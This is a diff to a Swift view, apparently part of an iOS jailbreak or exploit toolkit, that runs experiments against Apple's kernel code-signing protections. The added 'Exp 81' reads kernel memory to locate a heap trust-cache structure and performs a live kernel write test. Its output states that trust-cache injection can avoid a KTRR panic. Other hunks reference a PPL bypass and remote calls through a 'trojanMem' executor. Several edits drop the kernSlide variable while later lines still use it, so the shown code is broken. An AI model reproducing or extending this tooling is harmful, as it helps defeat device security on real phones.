@@ -699,6 +699,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③c Heap TC Analysis (Exp 81)",
+                    icon: "doc.text.magnifyingglass",
+                    color: .pink,
+                    label: "Heap TC",
+                    action: runExp81HeapTCAnalysis,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "④ Test Binary Spawn",
                     icon: "terminal.fill",
                     color: .indigo,
@@ -945,6 +955,24 @@ struct AMFIExperimentView: View {
         runningLabel = ""
         #endif
     }
+
+    private func runExp81HeapTCAnalysis() {
+        isRunning = true
+        runningLabel = "Heap TC"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expHeapTCAnalysis()
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+        }
+    }
     private func runExp78() {
         runExperiment(label: "DART", operation: "exp78_dart", append: true) { rc in
             self.expDARTPTEProbe(rc: rc)
@@ -1113,7 +1141,7 @@ struct AMFIExperimentView: View {
         let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
         let ioServiceGetMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
         let ioServiceOpen = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
-        let ioServiceClose = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceClose"))
+        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceClose"))
         
         guard ioServiceMatching != 0 && ioServiceGetMatching != 0 && ioServiceOpen != 0 else {
             detail += "IOKit functions not available\n"
@@ -1745,9 +1773,9 @@ struct AMFIExperimentView: View {
         
         let RTLD_DEFAULT = UInt64(bitPattern: -2)
         let ioServiceMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceMatching"))
-        let ioServiceGetMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceGetMatchingService"))
-        let ioServiceOpen = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceOpen"))
-        let ioConnectCallScalar = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOConnectCallScalarMethod"))
+        let _ = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceGetMatchingService"))
+        let _ = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceOpen"))
+        let _ = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOConnectCallScalarMethod"))
         
         var amfiConnect: UInt32 = 0
         
@@ -2202,7 +2230,7 @@ struct AMFIExperimentView: View {
         detail += "\nâ•â•â• PATH 3: Trust Cache scan â•â•â•\n"
         detail += "âš ï¸ DISABLED â€” scanning kernel memory near pmap_cs causes panic\n"
         detail += "Socket KRW cannot safely read arbitrary __DATA addresses\n"
-        let pointerCandidates: [(Int, UInt64)] = []
+        let _ = [] as [(Int, UInt64)]
         
         // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
         // PATH 4: IOSurface external method 9 (getValue)
@@ -3009,7 +3037,7 @@ struct AMFIExperimentView: View {
             return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: "No SB RC", timestamp: Date())
         }
         
-        let mem = sb.trojanMem
+        let _ = sb.trojanMem
         let mgr = dspmgr.shared
         var detail = "PPL Bypass via IOSurface Physical Memory\n\n"
         
@@ -3018,8 +3046,8 @@ struct AMFIExperimentView: View {
         // Step 1: Get IOSurface functions
         let ioCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceCreate"))
         let ioGetBase = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceGetBaseAddress"))
-        let ioLock = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceLock"))
-        let ioUnlock = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceUnlock"))
+        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceLock"))
+        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceUnlock"))
         let ioPrefetch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfacePrefetchPages"))
         
         detail += "IOSurfaceCreate: \(ioCreate != 0 ? "found" : "missing")\n"
@@ -3182,7 +3210,7 @@ struct AMFIExperimentView: View {
             return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: "No SB RC", timestamp: Date())
         }
         
-        let mem = rc.trojanMem
+        let _ = rc.trojanMem
         let sbMem = sb.trojanMem
         let mgr = dspmgr.shared
         var detail = "Physical Memory Discovery\n\n"
@@ -4067,7 +4095,7 @@ struct AMFIExperimentView: View {
         
         // Scan forward from proc in 32-byte steps (kalloc.32 alignment)
         var markerFound = false
-        var markerAddr: UInt64 = 0
+        var _: UInt64 = 0
         var scanCount = 0
         let scanRange: UInt64 = 0x10000  // 64KB scan range
         
@@ -4318,7 +4346,7 @@ struct AMFIExperimentView: View {
         }
 
         let kernBase = ds_get_kernel_base()
-        let kernSlide = ds_get_kernel_slide()
+        let _ = ds_get_kernel_slide()
         detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
         detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"
 
@@ -4389,7 +4417,7 @@ struct AMFIExperimentView: View {
 
         let physmap = PhysmapConstants.loadOrDefault()
         let kernBase = ds_get_kernel_base()
-        let kernSlide = ds_get_kernel_slide()
+        let _ = ds_get_kernel_slide()
         detail += "gVirtBase: 0x\(String(format: "%llx", physmap.gVirtBase)) (saved)\n"
         detail += "gPhysBase: 0x\(String(format: "%llx", physmap.gPhysBase))\n"
         detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
@@ -4693,6 +4721,83 @@ struct AMFIExperimentView: View {
         }
 
         return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 81: Heap TC Analysis
+    
+    private func expHeapTCAnalysis() -> ExperimentResult {
+        let expName = "Heap TC Analysis (Exp 81)"
+        var detail = "Experiment 81: Heap Pointer Analysis\n"
+        detail += "=====================================\n\n"
+
+        guard PhysmapConstants.isVerified else {
+            return ExperimentResult(name: expName, success: false, detail: "Jalankan Physmap Access (Exp 74) dulu.", timestamp: Date())
+        }
+
+        let kernBase = ds_get_kernel_base()
+        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
+        let dataSegBase = kernBase &+ dataOff
+        
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "__DATA base: 0x\(String(format: "%llx", dataSegBase))\n\n"
+
+        let targetOffsets: [UInt64] = [0x39b0, 0x38a0]
+        var foundHeapStructs = 0
+        
+        for off in targetOffsets {
+            let addr = dataSegBase &+ off
+            // Read pointer
+            let ptr = ds_kreadptr(addr)
+            detail += "kc+0x\(String(format: "%x", off)) (0x\(String(format: "%llx", addr))):\n"
+            detail += "  -> 0x\(String(format: "%llx", ptr))\n"
+            
+            if isSafeKernelHeapKreadAddress(ptr) {
+                detail += "  ✅ Pointer menunjuk ke Heap!\n"
+                // Analyze what is at the heap pointer
+                let ver = safeKread32Heap(ptr)
+                let cnt = safeKread32Heap(ptr &+ 4)
+                let nextPtr = safeKread64Heap(ptr &+ 0x10)
+                
+                detail += "  Header [ver=\(ver), cnt=\(cnt)]\n"
+                detail += "  Next ptr: 0x\(String(format: "%llx", nextPtr))\n"
+                
+                if (ver >= 1 && ver <= 16) || (cnt >= 1 && cnt <= 500_000) {
+                    detail += "  🎯 Ini kemungkinan besar Trust Cache struct di Heap!\n"
+                    foundHeapStructs += 1
+                    
+                    detail += "\n  Coba Write Test di Heap struct (+0x18 UUID field)...\n"
+                    let testAddr = ptr &+ 0x18
+                    let original = safeKread64Heap(testAddr)
+                    let sentinel: UInt64 = 0xdeadbeefcafebabe
+                    
+                    ds_kwrite64(testAddr, sentinel)
+                    let verify = safeKread64Heap(testAddr)
+                    if verify == sentinel {
+                        detail += "  ✅ Write Test SUKSES! (KTRR tidak memblokir Heap)\n"
+                        // Restore
+                        ds_kwrite64(testAddr, original)
+                    } else {
+                        detail += "  ❌ Write Test GAGAL! (Nilai tidak berubah)\n"
+                    }
+                } else {
+                    detail += "  ⚠️ Header tidak cocok dengan trust cache.\n"
+                }
+            } else if ptr == 0 {
+                detail += "  ⚠️ Nilai 0. (Belum ada dynamic trust cache yang diload)\n"
+            } else {
+                detail += "  ⚠️ Bukan pointer heap (kemungkinan __DATA atau mati).\n"
+            }
+            detail += "\n"
+        }
+        
+        detail += "KESIMPULAN:\n"
+        if foundHeapStructs > 0 {
+            detail += "Berhasil menemukan Heap Trust Cache. Injeksi via KRW bisa dilakukan tanpa KTRR panic!\n"
+        } else {
+            detail += "Tidak ada Heap Trust Cache yang aktif. Pancing dengan mount Developer Disk Image / aplikasi lain.\n"
+        }
+        
+        return ExperimentResult(name: expName, success: foundHeapStructs > 0, detail: detail, timestamp: Date())
     }
 
     // MARK: - Exp 79: KTRR Analysis (Write Test DINONAKTIFKAN — akan panic)
@@ -5071,7 +5176,7 @@ struct AMFIExperimentView: View {
         let gPhysBase = physmap.gPhysBase
         let gVirtBase = physmap.gVirtBase
         let kernBase = ds_get_kernel_base()
-        let kernSlide = ds_get_kernel_slide()
+        let _ = ds_get_kernel_slide()
 
         detail += "Mode: INJECT (physmap write)\n"
         detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\(PhysmapConstants.isVerified ? "" : " (default)")\n"
@@ -5209,7 +5314,7 @@ struct AMFIExperimentView: View {
         
         var tcStructAddr: UInt64 = 0
         var tcEntryCount: UInt64 = 0
-        var tcPhysmapBase: UInt64 = 0
+        var _: UInt64 = 0
         
         func tryTrustCachePointer(_ val: UInt64, label: String, physmapBase: UInt64 = 0) -> Bool {
             guard val > 0xffffffdc00000000 && val < 0xffffffe500000000 else { return false }
@@ -5525,7 +5630,7 @@ struct AMFIExperimentView: View {
         
         // Step 1: Get kernel pmap (page table root)
         let kernBase = ds_get_kernel_base()
-        let kernSlide = ds_get_kernel_slide()
+        let _ = ds_get_kernel_slide()
         detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
         detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"
         
@@ -5882,7 +5987,7 @@ struct AMFIExperimentView: View {
         detail += "⚠️ NO IOKit calls — pure ds_kread64 only\n\n"
         
         let kernBase = ds_get_kernel_base()
-        let kernSlide = ds_get_kernel_slide()
+        let _ = ds_get_kernel_slide()
         let physmap = PhysmapConstants.loadOrDefault()
         let gPhysBase = physmap.gPhysBase
         let gVirtBase = physmap.gVirtBase
@@ -5905,7 +6010,7 @@ struct AMFIExperimentView: View {
         var confirmedDARTL1: UInt64 = 0
         var confirmedL2Entries: [(iova: UInt64, pa: UInt64)] = []
         var dartMmioVA: UInt64 = 0
-        var dartObjectAddr: UInt64 = 0
+        var _: UInt64 = 0
         
         // ============================================================
         // STEP 1: Find IODARTMapper kernel object via vtable scan
